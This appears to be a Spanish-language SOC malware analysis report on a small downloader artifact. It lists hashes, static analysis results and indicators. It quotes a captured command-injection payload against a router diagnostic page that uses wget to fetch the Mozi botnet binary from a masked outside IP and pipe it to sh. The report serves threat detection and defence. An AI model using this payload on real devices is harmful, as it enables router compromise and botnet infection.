# 🧬 Payload Analysis

`df9035bf9e75bad902d8deb7498cf462dfde07c59125f54402e2f84716adfdaa`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:25:57+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `df9035bf9e75bad902d8deb7498cf462dfde07c59125f54402e2f84716adfdaa`
- **MD5:** `f5e29e2501021107b581451177c6efb4`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 138 B |
| Entropía | 5.14 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Download indicators (wget/curl + /tmp)

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://202.47.56.XXX:59235/Mozi.m+-O+->/tmp/gpon80;sh
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 202.47.56.XXX | static_analysis |
| url | hxxp://202.47.56.XXX:59235/Mozi.m+-O+- | strings |
| hash | df9035bf9e75bad902d8deb7498cf462dfde07c59125f54402e2f84716adfdaa | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://202.47.56.XXX:59235/Mozi.m+-O+->/tmp/gpon80;sh | strings |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
